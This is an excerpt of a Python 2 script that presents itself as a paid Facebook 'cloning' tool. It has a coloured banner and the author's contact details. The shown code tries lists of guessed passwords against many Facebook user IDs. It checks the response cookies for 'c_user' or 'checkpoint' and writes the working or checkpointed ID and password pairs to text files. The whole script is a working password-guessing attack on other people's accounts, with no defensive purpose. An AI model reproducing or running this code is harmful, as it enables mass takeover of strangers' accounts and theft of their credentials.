...
logo = "'\n\x1b[1;91m' ##:::'##:'##::::'##::::'###::::'##::: ##:\n'\x1b[1;92m'##::'##:: ##:::: ##:::'## ##::: ###:: ##:\n'\x1b[1;91m'##:'##::: ##:::: ##::'##:. ##:: ####: ##:\n'\x1b[1;97m'#####:::: #########:'##:::. ##: ## ## ##:\n'\x1b[1;93m'##. ##::: ##.... ##: #########: ##. ####:\n'\x1b[1;94m'##:. ##:: ##:::: ##: ##.... ##: ##:. ###:\n'\x1b[1;92m'##::. ##: ##:::: ##: ##:::: ##: ##::. ##:\n'\x1b[1;91m'..::::..::..:::::..::..:::::..::..::::..::\n\t\n'\x1b[1;92m'   Author      :     iqraaa-XD     \n'\x1b[1;91m'   Github      :     iqraaaXKhan  \n'\x1b[1;96m'   FB ID       :     iqraaa Khan\n'\x1b[1;93m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;91m'   WAP NUMBER  :     03189339494            \n"
dec = '2'
server = '2'
...
def main_input():
    ...
    if mx == '1':
        ...
        print '        Member In iqraaa Paid Commands '
        print '        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/iqraaaXKhan/KHAN-XD')
        ...
        os.system('xdg-open https://wa.me/ban ho gya dost')
        time.sleep(3)
        main_system()
    else:
        print 'invild option'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[iqraaa-OK] ' + coc + user + ' | ' + pass1
                ok = open('iqraaa-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[iqraaa-CP] ' + coc + user + ' | ' + pass1
                cp = open('iqraaa random-co.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def fb_menu():
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;92m[1] Public Cloning  [iqraaaPro]'
    print '\x1b[1;92m[2] Public Cloning  [iqraaaFast]'
    print '\x1b[1;91m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning iqraaaPro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning iqraaaFast ]'
        print ''
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[iqraaa-OK] ' + uid + ' | ' + pass1
                ok = open('Subha-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[iqraaa-CP] ' + uid + ' | ' + pass1
                cp = open('iqraaa-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[iqraaa-OK] ' + uid + ' | ' + pass2
                    ok = open('iqraaa-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[iqraaa-CP] ' + uid + ' | ' + pass2
                    cp = open('iqraaa-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[iqraaa-OK] ' + uid + ' | ' + pass3
                        ok = open('iqraaa-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[iqraaa-CP] ' + uid + ' | ' + pass3
                        cp = open('iqraaa-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[iqraaa-OK] ' + uid + ' | ' + pass4
                            ok = open('iqraaa-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[iqraaa-CP] ' + uid + ' | ' + pass4
                            cp = open('iqraaa-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[iqraaa-OK] ' + uid + ' | ' + pass5
                                ok = open('iqraaa-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[iqraaa-CP] ' + uid + ' | ' + pass5
                                cp = open('iqraaa-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[iqraaa-OK] ' + uid + ' | ' + pass6
                                    ok = open('iqraaa-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;97m[iqraaa-CP] ' + uid + ' | ' + pass6
                                    cp = open('iqraaa-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
